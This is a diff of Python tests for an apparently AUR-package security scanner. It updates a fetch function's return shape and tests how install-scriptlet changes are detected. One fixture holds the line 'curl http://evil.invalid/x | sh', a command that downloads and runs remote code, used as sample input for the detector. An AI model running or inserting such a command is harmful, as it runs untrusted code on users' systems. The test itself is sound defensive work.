@@ -86,7 +86,7 @@ def test_fetch_pkgbuild_with_tree_extracts_manifest():
         "icon.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 8,
     })
     with patch.object(F, "_http_get", return_value=body):
-        text, manifest, trailer_finding, refused, install_text = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer_finding, refused, install_text, install_name = F.fetch_pkgbuild_with_tree("demo")
 
     assert text == "pkgname=demo\npkgver=1.0\n"
     assert manifest is not None
@@ -103,7 +103,7 @@ def test_fetch_pkgbuild_with_tree_falls_back_to_cgit():
     from trustsight.full_aur import fetch as F
 
     with patch.object(F, "_http_get", side_effect=[None, b"pkgname=demo\n"]):
-        text, manifest, trailer_finding, refused, install_text = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer_finding, refused, install_text, install_name = F.fetch_pkgbuild_with_tree("demo")
 
     assert text == "pkgname=demo\n"
     assert manifest is None
@@ -117,7 +117,7 @@ def test_fetch_pkgbuild_with_tree_flags_trailing_archive_bytes():
 
     body = _snapshot_tarball("demo", "pkgname=demo\npkgver=1.0\n") + b"JUNK"
     with patch.object(F, "_http_get", return_value=body):
-        text, manifest, trailer_finding, refused, install_text = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer_finding, refused, install_text, install_name = F.fetch_pkgbuild_with_tree("demo")
 
     assert text == "pkgname=demo\npkgver=1.0\n"
     assert manifest is not None
@@ -152,14 +152,14 @@ def test_iter_prefetched_yields_none_for_a_failing_fetch():
     def fetch(name):
         if name == "boom":
             raise RuntimeError("network")
-        return (f"ok-{name}", None, None, False, None)
+        return (f"ok-{name}", None, None, False, None, None)
 
     out = dict(_iter_prefetched(["a", "boom", "b"], fetch, workers=4))
-    # The placeholder must match the 4-tuple shape ``_store`` unpacks; a
+    # The placeholder must match the 6-tuple shape ``_store`` unpacks; a
     # 3-tuple here raised ValueError out of the analysis loop and aborted
     # the whole cycle.
-    assert out["boom"] == (None, None, None, False, None)
-    assert out["a"] == ("ok-a", None, None, False, None)
+    assert out["boom"] == (None, None, None, False, None, None)
+    assert out["a"] == ("ok-a", None, None, False, None, None)
 
 
 # --- polite fetching: rate cap + backoff on 429/5xx/reset ---
@@ -311,7 +311,7 @@ def test_a_not_vetted_package_survives_the_cycle_and_is_retried(monkeypatch):
                         lambda old, new: {"demo": "modified"})
     monkeypatch.setattr(pipeline, "load_resume_state", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree",
-                        lambda *a, **k: ("pkgver=1\n", None, None, False, None))
+                        lambda *a, **k: ("pkgver=1\n", None, None, False, None, None))
     monkeypatch.setattr(pipeline, "get_pkgbuild_snapshot", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "is_reserved_name", lambda _n: False)
     monkeypatch.setattr(pipeline, "_pkg_or_base", lambda _m: "demo")
@@ -419,7 +419,7 @@ def _stub_cycle(monkeypatch, pipeline, scores_by_name, order=None):
                         lambda old, new: {name: "modified" for name in meta})
     monkeypatch.setattr(pipeline, "load_resume_state", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree",
-                        lambda *a, **k: ("pkgbuild", None, None, False, None))
+                        lambda *a, **k: ("pkgbuild", None, None, False, None, None))
     monkeypatch.setattr(pipeline, "is_reserved_name", lambda _n: False)
     monkeypatch.setattr(pipeline, "_pkg_or_base", lambda _m: "demo")
     monkeypatch.setattr(pipeline, "save_resume_state", lambda state: None)
@@ -557,7 +557,7 @@ def _stub_since_cycle(monkeypatch, pipeline, packages):
     monkeypatch.setattr(pipeline, "diff_metadata", lambda old, new: {})
     monkeypatch.setattr(pipeline, "load_resume_state", lambda *a, **k: None)
     monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree",
-                        lambda *a, **k: ("pkgbuild", None, None, False, None))
+                        lambda *a, **k: ("pkgbuild", None, None, False, None, None))
     monkeypatch.setattr(pipeline, "is_reserved_name", lambda _n: False)
     monkeypatch.setattr(pipeline, "_pkg_or_base", lambda _m: "demo")
     monkeypatch.setattr(pipeline, "save_resume_state", lambda state: None)
@@ -776,6 +776,73 @@ def test_a_304_with_validators_but_no_snapshot_refetches(monkeypatch):
     assert calls == [True, False]
 
 
+def test_unchanged_install_scriptlet_is_not_represented_as_modified():
+    """R007 is 'Install File Modification': the corpus path re-added the
+    scriptlet hunk to every diff, so any package that merely HAS an install
+    hook fired R007 (and the hook-content rules) on every update.  Only a
+    scriptlet whose text changed is presented, matching the git path."""
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+
+    old_pkgbuild = "pkgname=demo\npkgver=1.0\ninstall=demo.install\n"
+    new_pkgbuild = "pkgname=demo\npkgver=1.1\ninstall=demo.install\n"
+    hook = "post_install() {\n  true\n}\n"
+
+    unchanged = analyze_package_text(
+        pkg_name="demo", old_pkgbuild=old_pkgbuild, new_pkgbuild=new_pkgbuild,
+        maintainer="tester", temporal=TemporalContext(),
+        install_text=hook, install_name="demo.install",
+        old_install_text=hook,
+    )
+    assert not any(e.rule_id == "R007" for e in unchanged.score_breakdown)
+
+    changed = analyze_package_text(
+        pkg_name="demo", old_pkgbuild=old_pkgbuild, new_pkgbuild=new_pkgbuild,
+        maintainer="tester", temporal=TemporalContext(),
+        install_text="post_install() {\n  echo hi\n}\n",
+        install_name="demo.install",
+        old_install_text=hook,
+    )
+    assert any(e.rule_id == "R007" for e in changed.score_breakdown)
+
+
+def test_install_hunk_uses_the_scriptlets_real_name():
+    """monsoon-git: the snapshot's scriptlet is ``monsoon.install`` while the
+    package is ``monsoon-git``.  Naming the synthesized hunk after the package
+    invented a file the recipe never ships, and C024 reported the real hook
+    as dead ("install= names monsoon.install, not it") on every cycle."""
+    from trustsight.config import ensure_default_configs
+    from trustsight.db import init_db
+    from trustsight.full_aur.analyze import TemporalContext, analyze_package_text
+
+    ensure_default_configs()
+    init_db()
+
+    pkgbuild = (
+        "pkgname=monsoon-git\npkgver=1.0\ninstall=monsoon.install\n"
+        "source=('https://example.invalid/monsoon.tar.gz')\n"
+        "sha256sums=('aaaa')\n"
+    )
+    fact = analyze_package_text(
+        pkg_name="monsoon-git",
+        old_pkgbuild="pkgname=monsoon-git\npkgver=0.9\ninstall=monsoon.install\n",
+        new_pkgbuild=pkgbuild,
+        maintainer="tester",
+        temporal=TemporalContext(),
+        install_text="post_install() {\n  true\n}\n",
+        install_name="monsoon.install",
+    )
+    assert not any(e.rule_id == "C024" for e in fact.score_breakdown)
+    # The content rules still see the scriptlet, under its real path.
+    r007 = [e for e in fact.score_breakdown if e.rule_id == "R007"]
+    assert r007 and "monsoon.install" in r007[0].reason
+    assert "monsoon-git.install" not in r007[0].reason
+
+
 def test_h103_reaches_the_corpus_first_seen_path():
     from trustsight.config import ensure_default_configs
     from trustsight.db import init_db
@@ -856,16 +923,17 @@ def test_fetch_extracts_the_install_scriptlet():
         {"demo.install": b"post_install() {\n  true\n}\n"},
     )
     with patch.object(F, "_http_get", return_value=body):
-        text, manifest, trailer, refused, install = F.fetch_pkgbuild_with_tree("demo")
+        text, manifest, trailer, refused, install, install_name = F.fetch_pkgbuild_with_tree("demo")
 
     assert install == "post_install() {\n  true\n}\n"
+    assert install_name == "demo.install"
 
 
 def test_install_scriptlet_becomes_an_added_file_in_the_corpus_diff():
     """The install rules only see the scriptlet once it is in the diff."""
     from trustsight.full_aur.analyze import _install_diff_text
 
-    diff = _install_diff_text("curl http://evil.invalid/x | sh\n", "yyay")
+    diff = _install_diff_text("curl http://evil.invalid/x | sh\n", "yyay.install")
     assert "+++ b/yyay.install" in diff
     assert "+curl http://evil.invalid/x | sh" in diff
     assert _install_diff_text("", "yyay") == ""
